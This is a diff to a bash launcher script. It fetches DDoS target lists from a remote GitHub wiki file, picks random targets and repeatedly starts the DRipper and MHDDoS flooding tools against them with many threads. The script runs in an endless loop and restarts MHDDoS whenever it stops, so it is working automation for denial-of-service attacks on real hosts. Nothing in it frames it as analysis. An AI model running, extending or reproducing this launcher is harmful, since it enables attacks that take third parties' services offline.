@@ -29,10 +29,7 @@ while true
 do
 
    # Get number of targets in DRipper_targets
-   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | wc -l)
-
-   ## Get random target from list of sites
-   site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | shuf -n 1)
+   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | wc -l)
 
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
@@ -44,7 +41,7 @@ do
    echo "Choosen targets:"
    for i in $random_numbers
    do
-             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
+             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | tail -n +6)")
              echo $site
              sleep 0.2
    done
@@ -54,6 +51,7 @@ do
    # Launch multiple MHDDoS instances
    for i in $random_numbers
    do
+            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | tail -n +6)")
             # Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
             cmd_line=$(echo $site | awk -F "#" '{print $1}')
 
@@ -65,14 +63,9 @@ do
             python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
    done
 
-# Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
-cmd_line=$(echo $site | awk -F "#" '{print $1}')
-echo "Choosen target - " $cmd_line
-
-## check if MHDDoS running. If it's not yet running or was terminated by error launch it.
+## check if MHDDoS running. If it's not yet running or was terminated, launch it.
 if [ `ps aux | grep MHDDoS | wc -l` != "2" ]; then
-        echo "time: "$(date +%H":"%M)
-#        echo "process is not running"
+        echo "MHDDoS not runnint. Time: "$(date +%H":"%M)
         python3 ~/MHDDoS/start.py $cmd_line
 fi
 sleep $check_interval
